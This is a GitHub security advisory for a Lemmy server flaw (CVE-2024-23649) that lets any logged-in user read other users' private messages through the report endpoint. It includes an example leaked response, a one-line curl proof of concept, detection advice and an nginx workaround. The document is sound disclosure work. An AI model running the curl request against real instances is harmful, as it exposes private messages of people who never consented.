# [H] Any authenticated user may obtain private message details from other users on the same instance

## Summary
Severity: High
Advisory: GHSA-r64r-5h43-26qv
CVE: CVE-2024-23649
CWE: CWE-200
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-01-24
Source: https://github.com/advisories/GHSA-r64r-5h43-26qv
Type: github-advisory

## Affected
- crates.io: `lemmy_server` — affected >=0.17.0 <0.19.1

## Details
### Summary
Users can report private messages, even when they're neither sender nor recipient of the message.
The API response to creating a private message report contains the private message itself, which means any user can just iterate over message ids to (loudly) obtain all private messages of an instance.
A user with instance admin privileges can also abuse this if the private message is removed from the response, as they're able to see the resulting reports.

### Details
Creating a private message report by POSTing to `/api/v3/private_message/report` does not validate whether the reporter is the recipient of the message.
At least lemmy-ui does not allow the sender to report the message; the API method should likely be restricted to accessible to recipients only.
The API response when creating a report contains the `private_message_report_view` with all the details of the report, including the private message that has been reported:
<details>

<summary>Example response</summary>

In the report below, the creator with id 3 is different from the private message creator (id 2) and private message recipient (id 6).

```json
{
  "private_message_report_view": {
    "private_message_report": {
      "id": 14,
      "creator_id": 3,
      "private_message_id": 7,
      "original_pm_text": "testfoo",
      "reason": "reporting id 7",
      "resolved": false,
      "published": "2023-12-15T19:23:03.441967Z"
    },
    "private_message": {
      "id": 7,
      "creator_id": 2,
      "recipient_id": 6,
      "content": "testfoo",
      "deleted": false,
      "read": false,
      "published": "2023-12-15T19:21:41.920872Z",
      "ap_id": "https://1b1w56.lem.rocks/private_message/7",
      "local": true
    },
    "private_message_creator": {
      "id": 2,
      "name": "admin",
      "banned": false,
      "published": "2023-12-14T23:45:05.055427Z",
      "actor_id": "https://1b1w56.lem.rocks/u/admin",
      "local": true,
      "deleted": false,
      "bot_account": false,
      "instance_id": 1
    },
    "creator": {
      "id": 3,
      "name": "testuser1",
      "banned": false,
      "published": "2023-12-14T23:47:57.571772Z",
      "actor_id": "https://1b1w56.lem.rocks/u/testuser1",
      "local": true,
      "deleted": false,
      "bot_account": false,
      "instance_id": 1
    }
  }
}
```

</details>

If these details were not available in the response, but reports could still be created by any user, or at least by any admin, this would allow an instance admin to create reports and obtain the message contents from the report system.

This was originally discovered from incorrect reports on a 0.18.5 instance and has been replicated in a 0.19.0 test environment.

### PoC

```bash
curl -v 'https://myinstance.tld/api/v3/private_message/report' -X POST -H 'Content-Type: application/json' -H 'authorization: Bearer ...' --data-raw '{"private_message_id":1,"reason":"i like reports"}'
```

### Impact
Any authenticated user can obtain arbitrary (untargeted) private message contents.
Privileges required depend on the instance configuration; when registratons are enabled without application system, the privileges required are practically none.
When registration applications are required, privileges required could be considered low, but this assessment heavily varies by instance.

### Detection

Any private message reports where the report creator is not equal to the private message recipient may be an attempt to exploit this.
As this was originally discovered from an incorrect report, likely related to a bug in a client app, it should be noted that not all mismatching reports should be considered malicious; though a frequent occurrence of them likely indicates an exploitation attempt.

### Workaround when updating is not immediately possible

If an update to a fixed Lemmy version is not immediately possible, the API route can be blocked in the reverse proxy.
This will prevent anyone from reporting private messages, but it will also prevent exploitation before the update has been applied.

nginx example:
```nginx
location = /api/v3/private_message/report {
  default_type application/json;
  return 403 '{"error":"couldnt_create_report"}';
}
```

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-r64r-5h43-26qv
- https://nvd.nist.gov/vuln/detail/CVE-2024-23649
- https://github.com/LemmyNet/lemmy/commit/bc32b408b523b9b64aa57b8e47748f96cce0dae5
- https://github.com/LemmyNet/lemmy
